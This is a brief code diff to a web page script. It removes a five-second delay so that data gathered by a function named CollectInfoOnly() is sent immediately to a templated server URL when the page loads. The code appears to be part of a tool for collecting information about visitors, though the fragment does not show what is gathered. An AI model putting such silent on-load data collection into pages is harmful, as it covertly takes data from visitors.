@@ -10,6 +10,7 @@
 	var data = CollectInfoOnly();
 	var xmlHttp = createRequest();
 	//setTimeout("alert('aaa')",1000);
-	setTimeout("request(xmlHttp,data,'__URL__/index')",5000); 
+	//setTimeout("request(xmlHttp,data,'__URL__/index')",5000); 
+	request(xmlHttp,data,'__URL__/index');
  </script>
  </html>
